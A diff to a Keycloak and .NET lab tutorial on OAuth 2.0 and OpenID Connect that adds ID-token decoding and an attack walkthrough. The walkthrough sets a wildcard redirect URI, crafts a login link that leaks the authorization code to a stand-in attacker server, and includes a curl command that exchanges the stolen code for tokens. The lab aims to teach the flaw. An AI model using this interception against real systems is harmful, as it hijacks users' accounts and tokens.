@@ -5,6 +5,21 @@ In the early web, if you wanted a new app to access your data (e.g., "Find frien
 
 OAuth 2.0 is the industry standard for delegated authorization. Unlike its predecessor (OAuth 1.0a), which required complex cryptographic signing for every request, OAuth 2.0 relies on **HTTPS (TLS)** for transport security and introduces specific "Flows" (Grant Types) optimized for different devices (Server, Mobile, SPA, IoT).
 
+**OpenID Connect (OIDC)** is a simple identity layer on top of OAuth 2.0. While OAuth 2.0 provides an Access Token (Authorization: "This key opens the door"), OIDC provides an ID Token (Authentication: "This key belongs to Alice").
+
+
+OAuth vs. OIDC: The Critical Difference
+
+Many developers confuse these two because they often happen in the same request.
+
+|Feature| OAuth 2.0 | OpenID Connect|
+|---|---|---|
+|Purpose|Authorization (Access)|Authentication (Identity)|
+|Artifact|access_token (Opaque or JWT)|id_token (Strict JWT)|
+|Analogy|A Hotel Key Card|A Passport|
+|Client Use|Send to API (Bearer Header)|Parse immediately to welcome user|
+---
+
 In this detailed lab, we will deploy a production-grade Identity Provider (**Keycloak**), build a .NET client, and manually intercept the "Authorization Code" to understand exactly how the delegation handshake works.
 
 ### 1. OAuth 1.0 vs 2.0: Why the change?
@@ -158,7 +173,7 @@ Create `client` folder. Create a minimal web project from within the client fold
 cd client
 dotnet new web -n AuthOAuth -o .
 ```
-Replace the content of `Program.cs` with the following code. It constructs the complex URL to redirect you to Keycloak.
+Replace the content of `Program.cs` with the following code. It constructs the complex URL to redirect you to Keycloak. It also decodes the resulting ID token JWT to display the user's profile.
 ```csharp
 using System.Net.Http;
 
@@ -179,7 +194,7 @@ var API_URL = "http://resource-api:8082/balance";
 
 app.MapGet("/", () => Results.Content("<h1><a href='/login'>Login with Keycloak</a></h1>", "text/html"));
 
-// STEP 1: Redirect the User to the Auth Server
+// STEP 1: Redirect the User to the Auth Server. It also specifies the openid scope, which prompts the Auth Server to issue a second artifact: the ID Token.
 app.MapGet("/login", () =>
 {
     var authUrl = $"{REALM_URL_EXTERNAL}/protocol/openid-connect/auth" +
@@ -227,6 +242,21 @@ app.MapGet("/callback", async (string code, string state, IHttpClientFactory fac
     var apiResponse = await apiClient.GetAsync(API_URL);
     var apiData = await apiResponse.Content.ReadAsStringAsync();
 
+
+    // B. Extract the ID Token
+    var idTokenString = jsonNode?["id_token"]?.ToString();
+    
+    if (string.IsNullOrEmpty(idTokenString))
+        return Results.Content("Error: No ID Token. Did you include 'openid' in the scope?");
+
+    // C. Decode the ID Token (The "Passport")
+    var handler = new JwtSecurityTokenHandler();
+    var jwt = handler.ReadJwtToken(idTokenString);
+
+    // D. Display the Claims
+    var claimsHtml = string.Join("", jwt.Claims.Select(c => $"<li><b>{c.Type}:</b> {c.Value}</li>"));
+
+
     // 3. Show Results
     var html = $@"
         <h1>OAuth Complete</h1>
@@ -235,6 +265,13 @@ app.MapGet("/callback", async (string code, string state, IHttpClientFactory fac
         
         <h3>Step 2: The Vault (Resource API Response)</h3>
         <pre style='background: #f4f4f4; padding: 10px; border: 1px solid #ccc;'>{apiData}</pre>
+
+        <h1>Authentication Successful</h1>
+        <h3>User Profile (From ID Token)</h3>
+        <ul>{claimsHtml}</ul>
+        <hr>
+        <h3>Raw Token</h3>
+        <textarea rows='4' cols='80'>{idTokenString}</textarea>
         
         <p>Authentication: Keycloak (8080) -> Client (8081) -> API (8082)</p>
     ";
@@ -293,7 +330,7 @@ Your browser passed that code to the .NET app. The .NET app took that code, turn
 If the code is valid, Keycloak responds with the JSON you see on screen:
 - **access_token:** The JWT (valid for 5 min).
 - **refresh_token:** The Reuse Ticket (valid for 30 min).
-- **id_token:** The Identity Card (Name, Email).
+- **id_token:** The Identity Card (Name, Email). It also lists claims.
 
 The client app uses access token from this response to call the resource api to get the data it needs. The Output Should Look Like:
 
@@ -311,13 +348,35 @@ Notice that the **Resource API (Port 8082)** does not have a database of users. 
 It relies entirely on the **cryptographic signature** of the token. As long as Keycloak signed it, the API trusts it. This is the essence of **Microservices Security**. One Identity Provider can secure 100 different microservices without sharing user credentials with any of them.
 
 #### Step 4: Manual Exchange (The Hacker's Perspective)
-If you were an attacker and you tricked a user into clicking a malicious link that leaked their code, you could perform this exchange yourself using `curl`:
+Let's simulate a misconfiguration that allows for code leak. OAuth relies on a whitelist of Valid Redirect URIs. If a lazy developer configures Keycloak to allow wildcards (e.g., *), an attacker can substitute the redirect_uri with their own server.
+
+1. **The Misconfiguration** (Simulating a Lazy Dev)
+- Log into **Keycloak Admin** (`http://localhost:8080`).
+- Go to **Clients** -> `dotnet-app`.
+- In **Access settings**, add `*` to **Valid Redirect URIs**.
+- **Save**. Note: NEVER do this in production.
+2. **The Malicious Link**
+The attacker crafts a URL that looks legitimate but sends the user's Code to google.com (simulating an attacker's log server).
+Copy and paste this into your browser:
+
+```text
+http://localhost:8080/realms/demo-realm/protocol/openid-connect/auth?client_id=dotnet-app&response_type=code&scope=openid%20profile&redirect_uri=https://google.com&state=attack
+```
+
+3. **The Exploit**
+- **The Lure**: The victim sees the real Keycloak login page. It looks 100% safe.
+- **The Action**: The victim logs in (student / password123).
+- **The Leak**: Instead of going to the app, the browser is redirected to google.com.
+- **The Capture**: Look at the address bar. The attacker now has your code:
+https://www.google.com/?code=8a73b...
+
+Now the attacker uses curl to trade that stolen code for your tokens (Access + ID):you could perform the exchange yourself using `curl`:
 ```bash
 curl -X POST http://localhost:8080/realms/demo-realm/protocol/openid-connect/token \
   -H "Content-Type: application/x-www-form-urlencoded" \
   -d "grant_type=authorization_code" \
   -d "client_id=dotnet-app" \
-  -d "redirect_uri=http://localhost:8081/callback" \
+  -d "redirect_uri=https://google.com" \
   -d "code=PASTE_THE_STOLEN_CODE_HERE"
 ```
 Note: This only works if the code hasn't been used yet. Codes self-destruct after one use!
